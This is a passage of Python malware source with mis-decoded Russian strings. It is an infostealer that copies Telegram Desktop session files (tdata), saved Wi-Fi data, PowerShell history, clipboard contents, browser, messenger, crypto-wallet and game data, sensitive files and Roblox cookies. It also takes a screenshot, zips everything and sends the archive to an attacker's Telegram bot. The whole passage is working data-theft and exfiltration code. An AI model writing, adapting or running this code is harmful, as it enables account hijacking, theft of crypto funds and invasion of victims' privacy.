                                    print(f"  –ù–∞–π–¥–µ–Ω –∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π —Ñ–∞–π–ª: {simple_path}")
                                    files_found += 1
                        except Exception:
                            continue
                
                if files_found >= max_files:
                    break
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –≤ {search_path}: {e}")
    
    if files_found == 0:
        print("  –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
    
    return sensitive_dir

def collect_telegram_files(temp_dir):
    telegram_paths = [
        os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Telegram Desktop'),
        r"W:\Users\User\AppData\Roaming\Telegram Desktop"
    ]
    
    tg_files_collected = False
    
    for tg_path in telegram_paths:
        if os.path.exists(tg_path):
            try:
                print(f"–ù–∞–π–¥–µ–Ω Telegram Desktop: {tg_path}")
                
                tg_dir = os.path.join(temp_dir, 'Telegram_Files')
                os.makedirs(tg_dir, exist_ok=True)
                
                tdata_path = os.path.join(tg_path, 'tdata')
                
                if os.path.exists(tdata_path):
                    tdata_dir = os.path.join(tg_dir, 'tdata')
                    os.makedirs(tdata_dir, exist_ok=True)
                    
                    critical_files = ['_key_data', 'settings', 'shortcuts-custom.json', 'usertag', 'config.json']
                    
                    session_folders = ['D', 'D877', 'D0']
                    
                    for item in os.listdir(tdata_path):
                        item_path = os.path.join(tdata_path, item)
                        dest_path = os.path.join(tdata_dir, item)
                        
                        try:
                            if os.path.isfile(item_path) and (item in critical_files or item.startswith('map')):
                                shutil.copy2(item_path, dest_path)
                                print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª: {item}")
                            elif os.path.isdir(item_path) and (item in session_folders or item.startswith('D')):
                                shutil.copytree(item_path, dest_path)
                                print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –ø–∞–ø–∫–∞: {item}")
                        except Exception as e:
                            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ {item}: {e}")
                    
                    tg_files_collected = True
                    print("–ó–∞–≤–µ—Ä—à–µ–Ω–æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ Telegram")
                else:
                    print(f"–ü–∞–ø–∫–∞ tdata –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –ø–æ –ø—É—Ç–∏: {tdata_path}")
                    
                    for item in os.listdir(tg_path):
                        item_path = os.path.join(tg_path, item)
                        dest_path = os.path.join(tg_dir, item)
                        
                        try:
                            if os.path.isfile(item_path):
                                shutil.copy2(item_path, dest_path)
                                print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª: {item}")
                            elif os.path.isdir(item_path) and item != 'tupdates' and item != 'tdumps':
                                shutil.copytree(item_path, dest_path)
                                print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –ø–∞–ø–∫–∞: {item}")
                        except Exception as e:
                            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ {item}: {e}")
                    
                    tg_files_collected = True
                
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö Telegram: {e}")
                traceback.print_exc()
        
        if tg_files_collected:
            break
    
    return tg_files_collected

def collect_and_zip_files():
    zip_filename = "collected_data.zip"
    
    temp_base = os.environ.get('TEMP', os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Temp'))
    temp_dir = os.path.join(temp_base, "pc_info_data_" + datetime.now().strftime("%Y%m%d%H%M%S"))
    
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    print(f"–ù–∞—á–∏–Ω–∞—é —Å–±–æ—Ä —Ñ–∞–π–ª–æ–≤ –≤ {temp_dir}...")
    
    system_dir = os.path.join(temp_dir, 'System_Info')
    os.makedirs(system_dir, exist_ok=True)
    
    try:
        programs_file = get_installed_programs()
        if programs_file and os.path.exists(programs_file):
            shutil.copy2(programs_file, os.path.join(system_dir, 'installed_programs.txt'))
            os.remove(programs_file)
            print("–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Å–ø–∏—Å–æ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º")
        
        wifi_file = get_saved_wifi()
        if wifi_file and os.path.exists(wifi_file):
            shutil.copy2(wifi_file, os.path.join(system_dir, 'saved_wifi.txt'))
            os.remove(wifi_file)
            print("–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Å–ø–∏—Å–æ–∫ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö Wi-Fi —Å–µ—Ç–µ–π")
        
        ps_history = get_powershell_history()
        if ps_history and os.path.exists(ps_history):
            shutil.copy2(ps_history, os.path.join(system_dir, 'powershell_history.txt'))
            print("–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –∏—Å—Ç–æ—Ä–∏—è PowerShell")
        
        clipboard_file = capture_clipboard()
        if clipboard_file and os.path.exists(clipboard_file):
            ext = os.path.splitext(clipboard_file)[1]
            shutil.copy2(clipboard_file, os.path.join(system_dir, f'clipboard{ext}'))
            os.remove(clipboard_file)
            print("–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
    
    telegram_collected = collect_telegram_files(temp_dir)
    if not telegram_collected:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–±—Ä–∞—Ç—å —Ñ–∞–π–ª—ã Telegram Desktop")
    
    try:
        collect_browser_data(temp_dir)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤: {e}")
    
    try:
        collect_messenger_data(temp_dir)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–æ–≤: {e}")
    
    try:
        collect_crypto_wallets(temp_dir)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª—å–∫–æ–≤: {e}")
    
    try:
        collect_game_data(temp_dir)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –∏–≥—Ä–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
    
    try:
        find_sensitive_files(temp_dir)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤: {e}")
    
    roblox_cookies = retrieve_roblox_cookies()
    if roblox_cookies:
        roblox_dir = os.path.join(temp_dir, 'Roblox_Data')
        os.makedirs(roblox_dir, exist_ok=True)
        try:
            shutil.copy2(roblox_cookies, os.path.join(roblox_dir, 'robloxcookies.dat'))
            print("–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã Roblox cookies")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ Roblox cookies: {e}")
    
    print("–°–æ–∑–¥–∞—é ZIP-–∞—Ä—Ö–∏–≤...")
    try:
        zip_path = os.path.join(temp_base, zip_filename)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        rel_path = os.path.relpath(file_path, temp_dir)
                        if len(rel_path) > MAX_PATH_LENGTH:
                            continue
                        zipf.write(file_path, rel_path)
                    except Exception as e:
                        print(f"–ü—Ä–æ–ø—É—Å–∫ —Ñ–∞–π–ª–∞ –≤ –∞—Ä—Ö–∏–≤–µ: {file_path}")
        
        shutil.copy2(zip_path, zip_filename)
        os.remove(zip_path)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ ZIP-–∞—Ä—Ö–∏–≤–∞: {e}")
        try:
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            rel_path = os.path.relpath(file_path, temp_dir)
                            zipf.write(file_path, rel_path)
                        except:
                            pass
        except:
            print("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞—Ä—Ö–∏–≤–∞!")
    
    try:
        shutil.rmtree(temp_dir)
    except:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥")
    
    return zip_filename

def send_info_to_telegram():
    try:
        system_info = get_system_info()
        
        screenshot_path = take_screenshot()
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(USER_ID, photo, caption=system_info)
        
        os.remove(screenshot_path)
        
        bot.send_message(USER_ID, "üîç –ù–∞—á–∏–Ω–∞—é —Å–±–æ—Ä —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, —ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è...")
        
        close_applications()
        
        print("–°–±–æ—Ä –∏ —É–ø–∞–∫–æ–≤–∫–∞ —Ñ–∞–π–ª–æ–≤...")
        zip_file = collect_and_zip_files()
        
        if os.path.exists(zip_file) and os.path.getsize(zip_file) > 0:
            zip_size_mb = os.path.getsize(zip_file) / (1024 * 1024)
            print(f"–†–∞–∑–º–µ—Ä –∞—Ä—Ö–∏–≤–∞: {zip_size_mb:.2f} MB")
            
            print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ ZIP-–∞—Ä—Ö–∏–≤–∞ {zip_file}...")
            
            if zip_size_mb > 50:
                bot.send_message(USER_ID, f"‚ö†Ô∏è –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: —Ä–∞–∑–º–µ—Ä —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –±–æ–ª—å—à–æ–π ({zip_size_mb:.2f} MB). –û—Ç–ø—Ä–∞–≤–∫–∞ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è.")
            
            with open(zip_file, 'rb') as doc:
                bot.send_document(USER_ID, doc, caption=f"üì¶ –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞. –†–∞–∑–º–µ—Ä: {zip_size_mb:.2f} MB")
            
            os.remove(zip_file)
            
            bot.send_message(USER_ID, "‚úÖ –°–±–æ—Ä –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω—ã!")
        else:
            print("–ê—Ä—Ö–∏–≤ –ø—É—Å—Ç–æ–π –∏–ª–∏ –Ω–µ —Å–æ–∑–¥–∞–Ω!")
            bot.send_message(USER_ID, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞—Ä—Ö–∏–≤–∞ —Å –¥–∞–Ω–Ω—ã–º–∏!")
        
        return True
    except Exception as e:
        error_msg = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö: {e}"
        print(error_msg)
        traceback.print_exc()
        
        try:
            bot.send_message(USER_ID, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {error_msg}")
        except:
            pass
            
        return False

if __name__ == "__main__":
    print("–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ –∏ —Å–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞...")
    send_info_to_telegram()
    print("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram.")
